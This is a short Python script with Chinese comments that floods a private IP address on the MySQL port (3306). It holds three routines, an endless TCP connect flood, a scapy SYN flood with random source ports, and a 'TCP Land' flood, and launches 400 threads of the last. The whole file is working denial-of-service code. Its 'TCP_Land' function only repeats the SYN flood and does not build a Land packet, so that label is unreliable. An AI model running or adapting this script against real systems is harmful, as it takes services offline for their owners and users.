# 模拟各类泛洪操作
import random
import socket,threading
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

# 基于TCP三次链接实施泛洪
def socket_flood():
    while True:
        s = socket.socket()
        s.connect(('192.168.230.147',3306))


# scapy 半连接泛洪
def scapy_flood():
    while True:
        random_sport = random.randint(20000,30000)
        pkg = IP(dst='192.168.230.147')/TCP(sport=random_sport,dport=3306,flags='S')
        send(pkg,verbose=False)


# TCP Land泛洪
def TCP_Land():
    while True:
        random_sport = random.randint(20000,30000)
        pkg = IP(dst='192.168.230.147')/TCP(sport=random_sport,dport=3306,flags='S')
        send(pkg,verbose=False)


if __name__ == '__main__':
    for i in range(400):
        # t = threading.Thread(target=socket_flood)
        # t = threading.Thread(target=scapy_flood)
        t = threading.Thread(target=TCP_Land)
        t.start()